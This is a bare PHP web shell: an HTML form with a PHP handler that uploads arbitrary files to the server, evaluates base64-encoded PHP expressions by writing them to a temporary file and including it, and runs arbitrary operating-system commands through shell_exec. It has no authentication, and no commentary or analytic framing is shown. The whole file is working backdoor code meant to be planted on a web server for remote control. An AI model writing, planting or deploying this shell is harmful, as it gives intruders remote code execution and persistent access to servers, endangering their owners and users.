<style>body{background-color:#000;color:#fff}</style><form action=""enctype="multipart/form-data"id="uploader"method="post"name="uploader"><input name="file"type="file"size="50"><input name="_upl"id="_upl"type="submit"value="Upload"><br><br><label for="">PHP command</label><input name="phpcmd"id=""><input name="_upl"id="_upl"type="submit"value="run php command"><br><br><label for="">Shell command</label><input name="shellcmd"id=""><input name="_upl"id="_upl"type="submit"value="run shell command"></form><?php 
if ($_POST["_upl"] == "Upload") {
    if (@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) {
    }
}
if ($_POST["_upl"] == "run php command") {
    $tmpFile = tempnam(sys_get_temp_dir(), "dynamic");
    $fileHandle = fopen($tmpFile, "w");
    $tmp = base64_decode($_POST["phpcmd"]);
    $vari = "<?php echo(" . $tmp . ");?>";
    fwrite($fileHandle, $vari);
    fclose($fileHandle);
    ob_start();
    include $tmpFile;
    $output = ob_get_clean();
    unlink($tmpFile);
    echo $output;
}
if ($_POST["_upl"] == "run shell command") {
    $tmpFile = tempnam(sys_get_temp_dir(), "dynamic");
    $fileHandle = fopen($tmpFile, "w");
    $tmp = $_POST["shellcmd"];
    $vari = "<?php echo(@shell_exec(\"" . $tmp . "\"));?>";
    fwrite($fileHandle, $vari);
    fclose($fileHandle);
    ob_start();
    include $tmpFile;
    $output = ob_get_clean();
    unlink($tmpFile);
    echo $output;
}
